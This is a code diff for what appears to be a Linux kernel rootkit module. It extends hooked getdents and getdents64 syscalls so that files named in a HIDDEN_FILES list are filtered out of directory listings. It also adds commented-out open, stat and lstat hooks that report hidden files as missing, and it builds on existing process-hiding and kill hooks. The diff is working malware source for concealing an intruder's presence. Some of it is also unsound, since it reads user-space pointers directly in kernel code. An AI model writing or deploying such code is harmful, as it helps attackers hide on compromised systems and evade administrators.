@@ -27,13 +27,15 @@ typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
 	struct linux_dirent64 *, unsigned int);
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+typedef asmlinkage long (*orig_open_t)(const char*, int);
+
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 //创建与删除一个/proc下面的项目
 struct proc_dir_entry *entry;
-static inline struct proc_dir_entry *
-proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
+//static inline struct proc_dir_entry *
+//proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
  
 void
 proc_remove(struct proc_dir_entry *entry);
@@ -87,6 +89,208 @@ is_invisible(pid_t pid)
 		return 1;
 	return 0;
 }
+
+//file hide
+bool should_hide_file(const char __user *filename)
+{
+    char *kern_buff = NULL;
+    int i;
+    bool to_hide = false;
+
+    
+    kern_buff = kzalloc(strlen(filename)+1, GFP_KERNEL);
+    if(!kern_buff)
+    {
+        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
+        goto cleanup;
+    }
+
+    if(copy_from_user(kern_buff, filename, strlen(filename)))
+    {   
+        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
+        goto cleanup;
+    }
+    
+
+    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+    {
+        // Hidden file is found
+        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
+        {
+            to_hide = true;
+            break;
+        }
+    }
+    
+    //DEBUG("Exited HACKED OPEN");
+
+cleanup:
+    if(kern_buff)
+        kfree(kern_buff);
+    return to_hide;
+}
+
+// Intercepts open to see if the user is somehow trying
+// to open a file that we are hiding.
+/*
+asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+{
+    long ret;
+    ret = orig_open(filename, flags, mode);
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+    return ret;
+}
+asmlinkage long hacked_lstat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf)
+{
+    long ret;
+    ret = orig_lstat(filename, statbuf);
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+    return ret;
+    
+}
+asmlinkage long hacked_stat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf)
+{
+    long ret;
+    ret = orig_stat(filename, statbuf);
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+    return ret;
+}*/
+
+// Will hide any files from within the dirp and return the new length of dirp
+long handle_ls(struct linux_dirent *dirp, long length)
+{
+    
+    unsigned int offset = 0;
+    struct linux_dirent *cur_dirent;
+    int i;
+    struct dirent *new_dirp = NULL;
+    int new_length = 0;
+    bool isHidden = false;
+
+    //struct dirent *moving_dirp = NULL;
+
+    //DEBUG("Entering LS filter");
+    // Create a new output buffer for the return of getdents
+    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
+    if(!new_dirp)
+    {
+        //DEBUG("RAN OUT OF MEMORY in LS Filter");
+        goto error;
+    }
+
+    // length is the length of memory (in bytes) pointed to by dirp
+    while (offset < length)
+    {
+        char *dirent_ptr = (char *)(dirp);
+        dirent_ptr += offset;
+        cur_dirent = (struct linux_dirent *)dirent_ptr;
+
+        isHidden = false;
+        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+        {
+            // Hidden file is found
+            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
+            {
+	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
+                isHidden = true;
+                break;
+            }
+        }
+        
+        if (!isHidden)
+        {
+            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
+            new_length += cur_dirent->d_reclen;
+        }
+        offset += cur_dirent->d_reclen;
+    }
+    //DEBUG("Exiting LS filter");
+
+    memcpy(dirp, new_dirp, new_length);
+    length = new_length;
+
+cleanup:
+    if(new_dirp)
+        kfree(new_dirp);
+    return length;
+error:
+    goto cleanup;
+}
+
+long handle_ls64(struct linux_dirent64 *dirp, long length)
+{
+    
+    unsigned int offset = 0;
+    struct linux_dirent64 *cur_dirent;
+    int i;
+    struct dirent *new_dirp = NULL;
+    int new_length = 0;
+    bool isHidden = false;
+
+    //struct dirent *moving_dirp = NULL;
+
+    //DEBUG("Entering LS filter");
+    // Create a new output buffer for the return of getdents
+    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
+    if(!new_dirp)
+    {
+        //DEBUG("RAN OUT OF MEMORY in LS Filter");
+        goto error;
+    }
+
+    // length is the length of memory (in bytes) pointed to by dirp
+    while (offset < length)
+    {
+        char *dirent_ptr = (char *)(dirp);
+        dirent_ptr += offset;
+        cur_dirent = (struct linux_dirent64 *)dirent_ptr;
+
+        isHidden = false;
+        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+        {
+            // Hidden file is found
+            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
+            {
+	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
+                isHidden = true;
+                break;
+            }
+        }
+        
+        if (!isHidden)
+        {
+            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
+            new_length += cur_dirent->d_reclen;
+        }
+        offset += cur_dirent->d_reclen;
+    }
+    //DEBUG("Exiting LS filter");
+
+    memcpy(dirp, new_dirp, new_length);
+    length = new_length;
+
+cleanup:
+    if(new_dirp)
+        kfree(new_dirp);
+    return length;
+error:
+    goto cleanup;
+}
+
+//
+
+
 //function responsible for hiding processes (64 bit version)
 asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
@@ -100,7 +304,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 
 	if (ret <= 0)
 		return ret;
-
+	ret = handle_ls64(dirent, ret);
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
 		return ret;
@@ -149,7 +353,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	if (ret <= 0)
 		return ret;
-
+	ret = handle_ls(dirent, ret);
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
 		return ret;
